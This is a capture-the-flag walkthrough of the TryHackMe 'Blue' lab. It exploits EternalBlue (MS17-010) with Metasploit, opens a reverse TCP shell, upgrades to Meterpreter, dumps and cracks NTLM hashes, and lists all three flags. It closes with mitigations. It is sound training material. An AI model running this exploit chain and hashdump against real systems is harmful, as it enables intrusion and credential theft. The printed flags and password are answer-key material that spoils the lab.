# Blue CTF Walkthrough

**Target:** Blue  
**Source:** [TryHackMe](https://tryhackme.com/room/blue)  
**Difficulty:** Easy  
**Target IP:** 10.49.162.101

## Table of Contents
- [Overview](#overview)
- [Reconnaissance](#reconnaissance)
- [Gain Access](#gain-access)
- [Escalate](#escalate)
- [Cracking](#cracking)
- [Flags](#flags)
- [Vulnerabilities](#vulnerabilities)

---

## Overview

Blue is an easy-difficulty CTF challenge that focuses on exploiting a well-known Windows SMB vulnerability. The machine runs Windows 7 with an unpatched SMBv1 service, making it susceptible to the EternalBlue exploit (MS17-010). The attack chain involves initial exploitation via Metasploit, upgrading to a Meterpreter shell, and dumping password hashes for offline cracking to retrieve flags.

**Key Skills Required:**
- Network scanning and enumeration
- Vulnerability identification with Nmap scripts
- Metasploit Framework usage
- Shell upgrading techniques
- Password hash dumping and cracking

---

## Reconnaissance

### Network Scanning

```bash
nmap -sV -sC -Pn -T4 10.49.162.101
```

**Results:**
- **Port 135/tcp:** Microsoft Windows RPC
- **Port 139/tcp:** Microsoft Windows netbios-ssn
- **Port 445/tcp:** Windows 7 Professional 7601 Service Pack 1 (microsoft-ds)

**Ports open under 1000:** `3`

### Vulnerability Scanning

```bash
nmap -p 135,139,445 --script=vuln 10.49.162.101
```

**Key Findings:**
- SMB vulnerability **MS17-010** detected (CVE-2017-0143)
- Risk level: **HIGH** — Remote Code Execution in Microsoft SMBv1 servers
- Disclosure date: 2017-03-14

**Machine is vulnerable to:** `ms17-010`

---

## Gain Access

### Finding the Exploit

```bash
msf > search ms17-010
```

**Exploit path:** `exploit/windows/smb/ms17_010_eternalblue`

### Configuring the Exploit

```bash
msf > use exploit/windows/smb/ms17_010_eternalblue
msf exploit(windows/smb/ms17_010_eternalblue) > show options
```

**Required option:** `RHOSTS`

Set the following options before running:

```bash
set RHOSTS 10.49.162.101
set payload windows/x64/shell/reverse_tcp
set LHOST tun0
run
```

**Result:** Initial shell established on the target machine.

---

## Escalate

### Upgrading Shell to Meterpreter

Background the shell with `CTRL + Z`, then search for the upgrade module:

```bash
msf exploit(windows/smb/ms17_010_eternalblue) > search shell_to_meterpreter
```

**Module:** `post/multi/manage/shell_to_meterpreter`

```bash
use post/multi/manage/shell_to_meterpreter
show options
```

**Required option to change:** `SESSION`

```bash
sessions -l
set SESSION 1
run
```

Switch to the new Meterpreter session:

```bash
msf post(multi/manage/shell_to_meterpreter) > sessions 2
```

**Verify elevated privileges:**

```bash
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter > getpid
Current pid: 1092
```

Confirm the process is running as SYSTEM using `ps`.

---

## Cracking

### Dumping Password Hashes

```bash
meterpreter > hashdump
```

**Output:**
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

**Non-default user:** `Jon`  
**Hash to crack:** `ffb43f0de35be4d9917ac0cc8ad57f8d`

### Cracking the Hash

```bash
echo "ffb43f0de35be4d9917ac0cc8ad57f8d" > hash.txt
john hash.txt --format=NT --wordlist=/usr/share/wordlists/rockyou.txt
```

**Cracked password:** `alqfna22`

---

## Flags

### Finding Flag Locations

```bash
meterpreter > search -f flag*
```

**Results:**

| Path | Size |
|------|------|
| `c:\flag1.txt` | 24 bytes |
| `c:\Windows\System32\config\flag2.txt` | 34 bytes |
| `c:\Users\Jon\Documents\flag3.txt` | 37 bytes |

### Flag 1 — System Root

```bash
meterpreter > cat c:\\flag1.txt
```

> `flag{access_the_machine}`

### Flag 2 — Password Storage Location (SAM Database)

```bash
meterpreter > cat c:\\Windows\\System32\\config\\flag2.txt
```

> `flag{sam_database_elevated_access}`

### Flag 3 — Administrator's Documents

```bash
meterpreter > cat c:\\Users\\Jon\\Documents\\flag3.txt
```

> `flag{admin_documents_can_be_valuable}`

---

## Flags Summary

| Flag | Value | Location |
|------|-------|----------|
| Flag 1 | `flag{access_the_machine}` | `c:\flag1.txt` |
| Flag 2 | `flag{sam_database_elevated_access}` | `c:\Windows\System32\config\flag2.txt` |
| Flag 3 | `flag{admin_documents_can_be_valuable}` | `c:\Users\Jon\Documents\flag3.txt` |

---

## Vulnerabilities

### 1. MS17-010 — EternalBlue (Critical)

**CVE:** CVE-2017-0143

**Description:** A critical remote code execution vulnerability in Microsoft SMBv1. The flaw allows an unauthenticated attacker to execute arbitrary code on a target system by sending specially crafted packets to the SMB service.

**Impact:** Full remote code execution with SYSTEM-level privileges, requiring no credentials.

**Mitigation:**
- Disable SMBv1 on all Windows systems
- Apply Microsoft security patch MS17-010 immediately
- Block ports 139 and 445 at the network perimeter
- Upgrade end-of-life operating systems (Windows 7)

### 2. Weak Password (Medium)

**Description:** The local user `Jon` had a weak password (`alqfna22`) that was present in the `rockyou.txt` wordlist and crackable in seconds with John the Ripper.

**Impact:** Credential compromise of a local account after hash extraction.

**Mitigation:**
- Enforce strong password policies (length, complexity)
- Use a password manager
- Implement account lockout policies
- Prefer certificate-based authentication

### 3. Unpatched / End-of-Life Operating System (Critical)

**Description:** The target runs Windows 7 Service Pack 1, which reached end-of-life in January 2020 and no longer receives security updates.

**Impact:** Exposure to all publicly known unpatched vulnerabilities with no vendor remediation path.

**Mitigation:**
- Upgrade to a supported Windows version
- Isolate legacy systems on segmented networks
- Apply compensating controls (host-based firewalls, IDS/IPS)

---

## Attack Chain Summary

```
Nmap port scan → 3 open ports (135, 139, 445)
    ↓
Nmap vuln scan → MS17-010 (EternalBlue) identified
    ↓
Metasploit → exploit/windows/smb/ms17_010_eternalblue
    ↓
Reverse TCP shell established
    ↓
Shell upgraded to Meterpreter (post/multi/manage/shell_to_meterpreter)
    ↓
Privilege confirmed: NT AUTHORITY\SYSTEM
    ↓
hashdump → NTLM hash for user Jon extracted
    ↓
John the Ripper → password cracked: alqfna22
    ↓
Flag 1 captured (c:\flag1.txt)
    ↓
Flag 2 captured (c:\Windows\System32\config\flag2.txt)
    ↓
Flag 3 captured (c:\Users\Jon\Documents\flag3.txt)
    ↓
Complete system compromise
```

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Nmap | Network scanning & vulnerability detection |
| Metasploit Framework | Exploitation & post-exploitation |
| John the Ripper | Password hash cracking |
| Meterpreter | Post-exploitation shell |

---

## References

- [TryHackMe — Blue](https://tryhackme.com/room/blue)
- [Microsoft Security Bulletin MS17-010](https://technet.microsoft.com/en-us/library/security/ms17-010.aspx)
- [CVE-2017-0143](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143)
- [EternalBlue — WannaCrypt Customer Guidance](https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/)

---
